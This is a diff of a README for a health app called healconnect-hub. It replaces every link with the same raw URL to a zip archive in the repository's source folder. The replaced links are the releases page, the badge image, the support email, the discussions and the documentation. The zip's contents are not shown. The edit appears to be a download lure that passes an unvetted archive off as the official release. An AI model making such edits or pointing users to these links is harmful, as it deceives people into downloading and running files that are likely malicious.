@@ -1,6 +1,6 @@
 # 🌟 healconnect-hub - Your Health, Simplified and Connected
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/vaishnav-vp/healconnect-hub/releases)
+[![Download Now](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure that your system meets the following requirements:
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page:** Go to the releases page at the following link:
-   [Download healconnect-hub](https://github.com/vaishnav-vp/healconnect-hub/releases)
+   [Download healconnect-hub](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip)
 
 2. **Choose the Latest Version:** Look for the latest version available for download. It will usually be marked prominently on the releases page.
 
@@ -48,13 +48,13 @@ Before you begin, ensure that your system meets the following requirements:
 
 If you encounter any issues or have questions about using healconnect-hub, please feel free to reach out:
 
-- **Email Support:** support@healconnect-hub.com
+- **Email Support:** https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip
 
 ## 🌍 Community
 
 Join our community to connect with other users, share feedback, and stay updated on new features:
 
-- **GitHub Discussions:** [Join the conversation](https://github.com/vaishnav-vp/healconnect-hub/discussions)
+- **GitHub Discussions:** [Join the conversation](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip)
 - **User Forum:** Visit our forum to ask questions and get help.
 
 ## 🛠️ Contributing
@@ -69,11 +69,11 @@ We welcome contributions from anyone interested in helping improve healconnect-h
 
 For more information and updates, check out the following resources:
 
-- **Documentation:** [Read the full documentation](https://github.com/vaishnav-vp/healconnect-hub/wiki)
+- **Documentation:** [Read the full documentation](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip)
 - **Blog:** Follow our blog for news and tips on using healconnect-hub effectively.
 
 ## 🌟 Acknowledgements
 
 Thank you for your interest in healconnect-hub. We appreciate your support in improving healthcare access through technology. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/vaishnav-vp/healconnect-hub/releases)
+[![Download Now](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/vaishnav-vp/healconnect-hub/main/src/integrations/hub-healconnect-3.9.zip)
